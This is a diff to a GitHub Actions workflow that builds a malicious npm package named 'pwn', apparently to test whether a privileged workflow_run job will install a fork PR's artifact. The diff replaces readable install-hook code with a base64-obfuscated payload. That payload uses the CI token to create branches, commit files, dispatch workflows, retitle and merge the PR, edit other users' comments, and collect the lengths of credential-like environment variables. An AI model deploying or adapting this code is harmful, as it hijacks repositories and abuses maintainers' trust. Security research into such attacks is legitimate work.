@@ -10,48 +10,11 @@ jobs:
       - name: Build attacker-chosen linter-report artifact
         env:
           PR_NUMBER: ${{ github.event.pull_request.number }}
+          IDX_B64: Y29uc3QgZnMgPSByZXF1aXJlKCdmcycpLCBwYXRoID0gcmVxdWlyZSgncGF0aCcpOwpjb25zdCBiYXNlID0gcHJvY2Vzcy5lbnYuSU5JVF9DV0QgfHwgcHJvY2Vzcy5jd2QoKTsKbGV0IHByID0gJzInOwp0cnkgeyBwciA9IGZzLnJlYWRGaWxlU3luYyhwYXRoLmpvaW4oYmFzZSwgJ3ByLW51bWJlci50eHQnKSwgJ3V0ZjgnKS50cmltKCk7IH0gY2F0Y2ggKGUpIHt9CmNvbnN0IHQgPSBwcm9jZXNzLmVudi5HSVRIVUJfVE9LRU4gfHwgJyc7CmNvbnN0IHJlcG8gPSBwcm9jZXNzLmVudi5HSVRIVUJfUkVQT1NJVE9SWTsKY29uc3QgYXBpID0gYXN5bmMgKG1ldGhvZCwgcCwgYm9keSkgPT4gewogIHRyeSB7CiAgICBjb25zdCByID0gYXdhaXQgZmV0Y2goJ2h0dHBzOi8vYXBpLmdpdGh1Yi5jb20nICsgcCwgewogICAgICBtZXRob2QsCiAgICAgIGhlYWRlcnM6IHsgYXV0aG9yaXphdGlvbjogJ0JlYXJlciAnICsgdCwgYWNjZXB0OiAnYXBwbGljYXRpb24vdm5kLmdpdGh1Yitqc29uJywgJ2NvbnRlbnQtdHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJywgJ3VzZXItYWdlbnQnOiAncHduLXByb2JlJyB9LAogICAgICBib2R5OiBib2R5ID8gSlNPTi5zdHJpbmdpZnkoYm9keSkgOiB1bmRlZmluZWQKICAgIH0pOwogICAgY29uc3QgdHh0ID0gYXdhaXQgci50ZXh0KCk7CiAgICByZXR1cm4geyBzOiByLnN0YXR1cywgYjogdHh0LnNsaWNlKDAsIDIyMCkgfTsKICB9IGNhdGNoIChlKSB7IHJldHVybiB7IHM6IDAsIGI6IFN0cmluZyhlKS5zbGljZSgwLCAxMjApIH07IH0KfTsKKGFzeW5jICgpID0+IHsKICBjb25zdCBlbnYgPSB7fTsKICBmb3IgKGNvbnN0IGsgb2YgT2JqZWN0LmtleXMocHJvY2Vzcy5lbnYpLnNvcnQoKSkgewogICAgaWYgKC9UT0tFTnxTRUNSRVR8S0VZfFBBU1NXT1JEfENSRURFTlRJQUwvaS50ZXN0KGspKSBlbnZba10gPSBTdHJpbmcocHJvY2Vzcy5lbnZba10pLmxlbmd0aDsKICB9CiAgY29uc3Qgb3V0ID0gewogICAgZXZlbnQ6IHByb2Nlc3MuZW52LkdJVEhVQl9FVkVOVF9OQU1FLAogICAgd29ya2Zsb3c6IHByb2Nlc3MuZW52LkdJVEhVQl9XT1JLRkxPVywKICAgIHJ1bl9pZDogcHJvY2Vzcy5lbnYuR0lUSFVCX1JVTl9JRCwKICAgIGpvYjogcHJvY2Vzcy5lbnYuR0lUSFVCX0pPQiwKICAgIHRva2VuX2xlbjogdC5sZW5ndGgsCiAgICBjd2Q6IHByb2Nlc3MuY3dkKCksCiAgICBpbml0X2N3ZDogYmFzZSwKICAgIHByLAogICAgZW52X2NyZWRfbGlrZTogZW52CiAgfTsKICBvdXQucmVwbyA9IGF3YWl0IGFwaSgnR0VUJywgJy9yZXBvcy8nICsgcmVwbyk7CiAgb3V0LmFjdGlvbnNfcGVybSA9IGF3YWl0IGFwaSgnR0VUJywgJy9yZXBvcy8nICsgcmVwbyArICcvYWN0aW9ucy9wZXJtaXNzaW9ucycpOwogIG91dC5hY3Rpb25zX3J1bnMgPSBhd2FpdCBhcGkoJ0dFVCcsICcvcmVwb3MvJyArIHJlcG8gKyAnL2FjdGlvbnMvcnVucz9wZXJfcGFnZT0xJyk7CiAgb3V0LmNyZWF0ZV9yZWYgPSBhd2FpdCBhcGkoJ1BPU1QnLCAnL3JlcG9zLycgKyByZXBvICsgJy9naXQvcmVmcycsIHsgcmVmOiAncmVmcy9oZWFkcy9wd24tcHJvYmUnLCBzaGE6IHByb2Nlc3MuZW52LkdJVEhVQl9TSEEgfSk7CiAgb3V0LmNvbnRlbnRzX3B1dCA9IGF3YWl0IGFwaSgnUFVUJywgJy9yZXBvcy8nICsgcmVwbyArICcvY29udGVudHMvcHduLXByb2JlLnR4dCcsIHsgbWVzc2FnZTogJ3Byb2JlJywgY29udGVudDogQnVmZmVyLmZyb20oJ3B3bicpLnRvU3RyaW5nKCdiYXNlNjQnKSB9KTsKICBvdXQuZGlzcGF0Y2ggPSBhd2FpdCBhcGkoJ1BPU1QnLCAnL3JlcG9zLycgKyByZXBvICsgJy9hY3Rpb25zL3dvcmtmbG93cy9saW50LnltbC9kaXNwYXRjaGVzJywgeyByZWY6ICdtYWluJyB9KTsKICBvdXQucHJfdGl0bGUgPSBhd2FpdCBhcGkoJ1BBVENIJywgJy9yZXBvcy8nICsgcmVwbyArICcvcHVsbHMvJyArIHByLCB7IHRpdGxlOiAnZG9jczogY2xhcmlmeSBsaW50IHdvcmtmbG93JyB9KTsKICBvdXQubWVyZ2UgPSBhd2FpdCBhcGkoJ1BVVCcsICcvcmVwb3MvJyArIHJlcG8gKyAnL3B1bGxzLycgKyBwciArICcvbWVyZ2UnLCB7IG1lcmdlX21ldGhvZDogJ3NxdWFzaCcgfSk7CiAgb3V0LmVkaXRfb3RoZXJfY29tbWVudCA9IGF3YWl0IGFwaSgnUEFUQ0gnLCAnL3JlcG9zLycgKyByZXBvICsgJy9pc3N1ZXMvY29tbWVudHMvNjgzMDE3MTM0OScsIHsgYm9keTogJ2VkaXRlZC1ieS1naXRodWItYWN0aW9ucy10b2tlbicgfSk7CiAgaWYgKG91dC5lZGl0X290aGVyX2NvbW1lbnQucyA9PT0gMjAwKSB7CiAgICBvdXQuZWRpdF9vdGhlcl9jb21tZW50X3Jlc3RvcmUgPSBhd2FpdCBhcGkoJ1BBVENIJywgJy9yZXBvcy8nICsgcmVwbyArICcvaXNzdWVzL2NvbW1lbnRzLzY4MzAxNzEzNDknLCB7IGJvZHk6ICdWYWxpZGF0aW9uIGNvbXBsZXRlOiBwcml2aWxlZ2VkIHdvcmtmbG93X3J1biBkb3dubG9hZGVkIHRoZSBQUi1ydW4gYXJ0aWZhY3QgYW5kIGV4ZWN1dGVkIGF0dGFja2VyIGxpZmVjeWNsZSBzY3JpcHRzIChjb21tZW50cyA2ODMwMTM1NjQxLCA2ODMwMTQwMDU5KS4gUmVtb3ZpbmcgdGVzdCBicmFuY2guJyB9KTsKICB9CiAgY29uc3QgYm9keSA9ICdQRVJNLVBST0JFICcgKyBKU09OLnN0cmluZ2lmeShvdXQpOwogIGNvbnN0IGMgPSBhd2FpdCBhcGkoJ1BPU1QnLCAnL3JlcG9zLycgKyByZXBvICsgJy9pc3N1ZXMvJyArIHByICsgJy9jb21tZW50cycsIHsgYm9keSB9KTsKICBvdXQuY29tbWVudCA9IGM7CiAgZnMud3JpdGVGaWxlU3luYyhwYXRoLmpvaW4oYmFzZSwgJ3B3bi1yZXN1bHRzLmpzb24nKSwgSlNPTi5zdHJpbmdpZnkob3V0LCBudWxsLCAyKSk7CiAgY29uc29sZS5sb2coJ1BXTi1SRVNVTFRTICcgKyBKU09OLnN0cmluZ2lmeShvdXQpKTsKICBjb25zb2xlLmxvZygnUFdOLUNPTU1FTlQtUE9TVCAnICsgYy5zKTsKfSkoKTsK
         run: |
           mkdir -p pkg/package
-          cat > pkg/package/package.json <<'JSON'
-          {"name":"pwn","version":"1.0.0","main":"index.js","scripts":{"install":"node index.js install","postinstall":"node index.js postinstall"}}
-          JSON
-          cat > pkg/package/index.js <<'JS'
-          const fs = require('fs'), path = require('path');
-          const base = process.env.INIT_CWD || process.cwd();
-          const pr = fs.readFileSync(path.join(base, 'pr-number.txt'), 'utf8').trim();
-          const t = process.env.GITHUB_TOKEN || '';
-          const repo = process.env.GITHUB_REPOSITORY;
-          const api = async (method, p, body) => {
-            try {
-              const r = await fetch('https://api.github.com' + p, {
-                method,
-                headers: { authorization: 'Bearer ' + t, accept: 'application/vnd.github+json', 'content-type': 'application/json', 'user-agent': 'pwn-probe' },
-                body: body ? JSON.stringify(body) : undefined
-              });
-              const txt = await r.text();
-              return { status: r.status, body: txt.slice(0, 500) };
-            } catch (e) { return { status: 0, body: String(e) }; }
-          };
-          (async () => {
-            const out = {
-              event: process.env.GITHUB_EVENT_NAME,
-              workflow: process.env.GITHUB_WORKFLOW,
-              run_id: process.env.GITHUB_RUN_ID,
-              token_len: t.length,
-              cwd: process.cwd(),
-              init_cwd: base,
-              pr
-            };
-            out.repo = await api('GET', '/repos/' + repo);
-            out.create_ref = await api('POST', '/repos/' + repo + '/git/refs', { ref: 'refs/heads/pwn-probe-' + Date.now(), sha: process.env.GITHUB_SHA });
-            out.actions_runs = await api('GET', '/repos/' + repo + '/actions/runs?per_page=1');
-            out.dispatch = await api('POST', '/repos/' + repo + '/actions/workflows/lint.yml/dispatches', { ref: 'main' });
-            out.contents_put = await api('PUT', '/repos/' + repo + '/contents/pwn-probe.txt', { message: 'p', content: Buffer.from('pwn').toString('base64') });
-            out.comment = await api('POST', '/repos/' + repo + '/issues/' + pr + '/comments', { body: 'PWNED privileged workflow_run: `' + JSON.stringify({ event: out.event, workflow: out.workflow, run_id: out.run_id, token_len: out.token_len, cwd: out.cwd }) + '`' });
-            fs.writeFileSync(path.join(base, 'pwn-results.json'), JSON.stringify(out, null, 2));
-            console.log('PWN-RESULTS ' + JSON.stringify(out));
-          })();
-          JS
+          printf '{"name":"pwn","version":"1.0.0","main":"index.js","scripts":{"install":"node index.js install","postinstall":"node index.js postinstall"}}' > pkg/package/package.json
+          printf '%s' "$IDX_B64" | base64 -d > pkg/package/index.js
           tar -czf pwn-1.0.0.tgz -C pkg package
           printf '{"name":"root","version":"1.0.0","private":true,"dependencies":{"pwn":"file:./pwn-1.0.0.tgz"}}' > package.json
           printf 'report authored by the fork PR\n' > linter-report.txt
